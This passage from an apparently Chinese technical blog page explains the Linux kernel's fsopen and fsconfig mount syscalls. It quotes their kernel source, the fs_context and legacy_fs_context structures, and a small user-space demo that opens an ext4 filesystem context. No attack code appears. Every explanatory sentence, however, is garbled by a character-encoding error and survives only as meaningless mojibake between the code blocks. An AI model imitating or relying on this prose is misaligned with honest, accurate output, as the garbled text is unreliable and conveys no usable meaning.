class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåˆ›å»ºçš„æ˜¯ä¸€ä¸ªç©ºç™½çš„æ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡ï¼Œå¹¶æ²¡æœ‰ä¸ä»»ä½•çš„å®é™…è®¾å¤‡è¿›è¡Œå…³è”ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE2(fsopen, <span class="keyword">const</span> <span class="keyword">char</span> __user *, _fs_name, <span class="keyword">unsigned</span> <span class="keyword">int</span>, flags)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_system_type</span> *<span class="title">fs_type</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fs_context</span> *<span class="title">fc</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *fs_name;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!ns_capable(current-&gt;nsproxy-&gt;mnt_ns-&gt;user_ns, CAP_SYS_ADMIN))</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flags &amp; ~FSOPEN_CLOEXEC)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">fs_name = strndup_user(_fs_name, PAGE_SIZE);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(fs_name))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(fs_name);</span><br><span class="line"></span><br><span class="line">fs_type = get_fs_type(fs_name);</span><br><span class="line">kfree(fs_name);</span><br><span class="line"><span class="keyword">if</span> (!fs_type)</span><br><span class="line"><span class="keyword">return</span> -ENODEV;</span><br><span class="line"></span><br><span class="line">fc = fs_context_for_mount(fs_type, <span class="number">0</span>);</span><br><span class="line">put_filesystem(fs_type);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(fc))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(fc);</span><br><span class="line"></span><br><span class="line">fc-&gt;phase = FS_CONTEXT_CREATE_PARAMS;</span><br><span class="line"></span><br><span class="line">ret = fscontext_alloc_log(fc);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_fc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> fscontext_create_fd(fc, flags &amp; FSOPEN_CLOEXEC ? O_CLOEXEC : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">err_fc:</span><br><span class="line">put_fs_context(fc);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨å†…æ ¸ä¸­è°ƒç”¨<code>fsopen</code>çš„ä¼šè¿›å…¥åˆ°å¦‚ä¸Šå‡½æ•°ï¼Œæœ€ç»ˆä¼šåœ¨<code>fscontext_create_fd</code>å‡½æ•°åˆ›å»ºä¸€ä¸ª<code>file</code>ç»“æ„ä½“ï¼Œå¹¶ä¸”è¿”å›æ–‡ä»¶æè¿°ç¬¦ã€‚</p><p><code>fscontext_alloc_log</code>é€šè¿‡åå­—å¯ä»¥çœ‹å‡ºæ¥è¿™é‡Œåˆ†é…çš„æ˜¯ç”¨äº<code>log</code>çš„å†…å­˜ã€‚</p><p><code>fs_context_for_mount</code>è¿™ä¸ªå‡½æ•°çš„è¿”å›å€¼çš„ç±»å‹ä¸º<code>fs_context</code>ï¼Œå…¶ä½œç”¨ä¹Ÿå°±æ˜¯åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡ç»“æ„ä½“ã€‚</p><p><code>strndup_user</code>å‡½æ•°åˆ™æ˜¯è·å–ç”¨æˆ·æ€ä¼ å…¥çš„æ–‡ä»¶ç³»ç»Ÿåï¼Œ<code>get_fs_type</code>è¿™é‡Œæ˜¯è·å–å…¶<code>type</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Filesystem context for holding the parameters used in the creation or</span></span><br><span class="line"><span class="comment"> * reconfiguration of a superblock.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Superblock creation fills in -&gt;root whereas reconfiguration begins with this</span></span><br><span class="line"><span class="comment"> * already set.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * See Documentation/filesystems/mount_api.txt</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fs_context</span> &#123;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">fs_context_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span><span class="title">uapi_mutex</span>;</span><span class="comment">/* Userspace access mutex */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_system_type</span>*<span class="title">fs_type</span>;</span></span><br><span class="line"><span class="keyword">void</span>*fs_private;<span class="comment">/* The filesystem&#x27;s context */</span></span><br><span class="line"><span class="keyword">void</span>*sget_key;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dentry</span>*<span class="title">root</span>;</span><span class="comment">/* The root and superblock */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span>*<span class="title">user_ns</span>;</span><span class="comment">/* The user namespace for this mount */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net</span>*<span class="title">net_ns</span>;</span><span class="comment">/* The network namespace for this mount */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>*<span class="title">cred</span>;</span><span class="comment">/* The mounter&#x27;s credentials */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fc_log</span>*<span class="title">log</span>;</span><span class="comment">/* Logging buffer */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>*source;<span class="comment">/* The source name (eg. dev path) */</span></span><br><span class="line"><span class="keyword">void</span>*security;<span class="comment">/* Linux S&amp;M options */</span></span><br><span class="line"><span class="keyword">void</span>*s_fs_info;<span class="comment">/* Proposed s_fs_info */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>sb_flags;<span class="comment">/* Proposed superblock flags (SB_*) */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>sb_flags_mask;<span class="comment">/* Superblock flags that were changed */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>s_iflags;<span class="comment">/* OR&#x27;d with sb-&gt;s_iflags */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>lsm_flags;<span class="comment">/* Information flags from the fs to the LSM */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">fs_context_purpose</span><span class="title">purpose</span>:</span><span class="number">8</span>;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">fs_context_phase</span><span class="title">phase</span>:</span><span class="number">8</span>;<span class="comment">/* The phase the context is in */</span></span><br><span class="line"><span class="keyword">bool</span>need_free:<span class="number">1</span>;<span class="comment">/* Need to call ops-&gt;free() */</span></span><br><span class="line"><span class="keyword">bool</span>global:<span class="number">1</span>;<span class="comment">/* Goes into &amp;init_user_ns */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢æ˜¯<code>fs_context</code>ç»“æ„ä½“çš„å®šä¹‰ï¼Œå‰é¢æåˆ°å…¶æ˜¯é€šè¿‡<code>fs_context_for_mount</code>å‡½æ•°ç”³è¯·çš„ï¼Œè¿™ä¸ªå‡½æ•°å†…éƒ¨æ˜¯ç›´æ¥è°ƒç”¨äº†<code>alloc_fs_context</code>å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * alloc_fs_context - Create a filesystem context.</span></span><br><span class="line"><span class="comment"> * @fs_type: The filesystem type.</span></span><br><span class="line"><span class="comment"> * @reference: The dentry from which this one derives (or NULL)</span></span><br><span class="line"><span class="comment"> * @sb_flags: Filesystem/superblock flags (SB_*)</span></span><br><span class="line"><span class="comment"> * @sb_flags_mask: Applicable members of @sb_flags</span></span><br><span class="line"><span class="comment"> * @purpose: The purpose that this configuration shall be used for.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Open a filesystem and create a mount context.  The mount context is</span></span><br><span class="line"><span class="comment"> * initialised with the supplied flags and, if a submount/automount from</span></span><br><span class="line"><span class="comment"> * another superblock (referred to by @reference) is supplied, may have</span></span><br><span class="line"><span class="comment"> * parameters such as namespaces copied across from that superblock.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct fs_context *<span class="title">alloc_fs_context</span><span class="params">(struct file_system_type *fs_type,</span></span></span><br><span class="line"><span class="params"><span class="function">      struct dentry *reference,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="keyword">unsigned</span> <span class="keyword">int</span> sb_flags,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="keyword">unsigned</span> <span class="keyword">int</span> sb_flags_mask,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="keyword">enum</span> fs_context_purpose purpose)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> (*init_fs_context)(struct fs_context *);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fs_context</span> *<span class="title">fc</span>;</span></span><br><span class="line"><span class="keyword">int</span> ret = -ENOMEM;</span><br><span class="line"></span><br><span class="line">fc = kzalloc(<span class="keyword">sizeof</span>(struct fs_context), GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!fc)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">fc-&gt;purpose= purpose;</span><br><span class="line">fc-&gt;sb_flags= sb_flags;</span><br><span class="line">fc-&gt;sb_flags_mask = sb_flags_mask;</span><br><span class="line">fc-&gt;fs_type= get_filesystem(fs_type);</span><br><span class="line">fc-&gt;cred= get_current_cred();</span><br><span class="line">fc-&gt;net_ns= get_net(current-&gt;nsproxy-&gt;net_ns);</span><br><span class="line"></span><br><span class="line">mutex_init(&amp;fc-&gt;uapi_mutex);</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (purpose) &#123;</span><br><span class="line"><span class="keyword">case</span> FS_CONTEXT_FOR_MOUNT:</span><br><span class="line">fc-&gt;user_ns = get_user_ns(fc-&gt;cred-&gt;user_ns);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> FS_CONTEXT_FOR_SUBMOUNT:</span><br><span class="line">fc-&gt;user_ns = get_user_ns(reference-&gt;d_sb-&gt;s_user_ns);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> FS_CONTEXT_FOR_RECONFIGURE:</span><br><span class="line">atomic_inc(&amp;reference-&gt;d_sb-&gt;s_active);</span><br><span class="line">fc-&gt;user_ns = get_user_ns(reference-&gt;d_sb-&gt;s_user_ns);</span><br><span class="line">fc-&gt;root = dget(reference);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* <span class="doctag">TODO:</span> Make all filesystems support this unconditionally */</span></span><br><span class="line">init_fs_context = fc-&gt;fs_type-&gt;init_fs_context;</span><br><span class="line"><span class="keyword">if</span> (!init_fs_context)</span><br><span class="line">init_fs_context = legacy_init_fs_context;</span><br><span class="line"></span><br><span class="line">ret = init_fs_context(fc);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_fc;</span><br><span class="line">fc-&gt;need_free = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">return</span> fc;</span><br><span class="line"></span><br><span class="line">err_fc:</span><br><span class="line">put_fs_context(fc);</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆè¿™é‡Œé€šè¿‡<code>kzalloc</code>å‡½æ•°åˆ†é…ä¸€ä¸ªå †å—ç»™åˆ°äº†<code>fs_context</code>ç»“æ„ä½“ï¼Œåç»­è®¾ç½®å…¶å¯¹åº”çš„å±æ€§ï¼Œæ¥ç€è®¾ç½®å…¶å‘½åç©ºé—´ï¼Œæœ€ååˆ™æ˜¯è¿›è¡Œåˆå§‹åŒ–ã€‚</p><p>åœ¨å®Œæˆäº†å‰é¢çš„æ“ä½œä¹‹åï¼Œæœ€ç»ˆè¿›è¡Œå…·ä½“æ–‡ä»¶ç³»ç»Ÿå¯¹åº”åˆå§‹åŒ–å·¥ä½œçš„å…¶å®æ˜¯è°ƒç”¨ <code>file_system_type</code> ä¸­çš„ <code>init_fs_context</code> å‡½æ•°æŒ‡é’ˆå¯¹åº”çš„å‡½æ•°å®Œæˆçš„ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¯¹äºæœªè®¾ç½® <code>init_fs_context</code> çš„æ–‡ä»¶ç³»ç»Ÿç±»å‹è€Œè¨€å…¶æœ€ç»ˆä¼šè°ƒç”¨ <code>legacy_init_fs_context()</code> è¿›è¡Œåˆå§‹åŒ–</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">legacy_init_fs_context</span><span class="params">(struct fs_context *fc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">fc-&gt;fs_private = kzalloc(<span class="keyword">sizeof</span>(struct legacy_fs_context), GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!fc-&gt;fs_private)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">fc-&gt;ops = &amp;legacy_fs_context_ops;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ä¸»è¦æ“ä½œæ˜¯ç»™<code>fs_context-&gt;fs_private</code>åˆ†é…<code>legacy_fs_context</code>ç»“æ„ä½“ï¼Œå¹¶èµ‹å€¼å…¶opsä¸º<code>legacy_fs_context_ops</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">legacy_fs_context</span> &#123;</span></span><br><span class="line"><span class="keyword">char</span>*legacy_data;<span class="comment">/* Data page for legacy filesystems */</span></span><br><span class="line"><span class="keyword">size_t</span>data_size;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">legacy_fs_param</span><span class="title">param_type</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ç»“æ„ä½“å®šä¹‰å¦‚ä¸Šï¼Œæ ‡è¯†äº†ä¸€å—æŒ‡å®šé•¿åº¦ä¸ç±»å‹çš„ç¼“å†²åŒºã€‚</p><h3 id="fsconfig"><a href="#fsconfig" class="headerlink" title="fsconfig"></a>fsconfig</h3><p>åœ¨å®Œæˆäº†ç©ºç™½çš„æ–‡ä»¶ç³»ç»Ÿä¸Šä¸‹æ–‡çš„åˆ›å»ºä¹‹åï¼Œæˆ‘ä»¬è¿˜éœ€è¦å¯¹å…¶è¿›è¡Œç›¸åº”çš„é…ç½®ï¼Œä»¥ä¾¿äºåç»­çš„æŒ‚è½½æ“ä½œï¼Œè¿™ä¸ªé…ç½®çš„åŠŸèƒ½å¯¹åº”åˆ°çš„å°±æ˜¯ <code>fsconfig()</code> ç³»ç»Ÿè°ƒç”¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/mount.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsopen</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsopen 430</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __NR_fsconfig</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_fsconfig 431</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fs_name, <span class="keyword">unsigned</span> <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsopen, fs_name, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fsconfig</span><span class="params">(<span class="keyword">int</span> fsfd, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">const</span> <span class="keyword">char</span> *key, <span class="keyword">const</span> <span class="keyword">void</span> *val, <span class="keyword">int</span> aux)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fs_fd;</span><br><span class="line">    </span><br><span class="line">    fs_fd = fsopen(<span class="string">&quot;ext4&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fs_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] FAILED to fsopen!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Successfully get an ext4 filesystem context descriptor:%d\n&quot;</span>, fs_fd);</span><br><span class="line"></span><br><span class="line">    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="string">&quot;source&quot;</span>, <span class="string">&quot;/dev/sdb1&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    fsconfig(fs_fd, FSCONFIG_CMD_CREATE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>fsconfig()</code> ç³»ç»Ÿè°ƒç”¨æ ¹æ®ä¸åŒçš„ cmd è¿›è¡Œä¸åŒçš„æ“ä½œï¼Œå¯¹äºæŒ‚è½½æ–‡ä»¶ç³»ç»Ÿè€Œè¨€å…¶æ ¸å¿ƒæ“ä½œä¸»è¦å°±æ˜¯ä¸¤ä¸ª cmdï¼š</p><ul><li>  <code>FSCONFIG_SET_STRING</code> ï¼šè®¾ç½®ä¸åŒçš„é”®å€¼å¯¹å‚æ•°</li><li>  <code>FSCONFIG_CMD_CREATE</code>ï¼šè·å¾—ä¸€ä¸ª superblock å¹¶åˆ›å»ºä¸€ä¸ª root entry</li></ul><p>ç¤ºä¾‹ç”¨æ³•å¦‚ä¸Šæ‰€ç¤ºï¼Œè¿™é‡Œåˆ›å»ºäº†ä¸€ä¸ªé”®å€¼å¯¹ <code>&quot;source&quot;=/dev/sdb1</code> è¡¨ç¤ºæ–‡ä»¶ç³»ç»Ÿæºæ‰€åœ¨çš„è®¾å¤‡å</p><p>åœ¨å†…æ ¸ä¸­ä¹Ÿæ˜¯<code>fsconfig</code>çš„å®ç°ä¹Ÿæ˜¯æ¯”è¾ƒé•¿ï¼Œä¸»è¦æ ¹æ®ä¸åŒçš„cmdè¿›å…¥åˆ°ä¸åŒçš„swithåˆ†æ”¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE5(fsconfig,</span><br><span class="line"><span class="keyword">int</span>, fd,</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>, cmd,</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> __user *, _key,</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">void</span> __user *, _value,</span><br><span class="line"><span class="keyword">int</span>, aux)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fs_context</span> *<span class="title">fc</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fs_parameter</span> <span class="title">param</span> =</span> &#123;</span><br><span class="line">.type= fs_value_is_undefined,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span 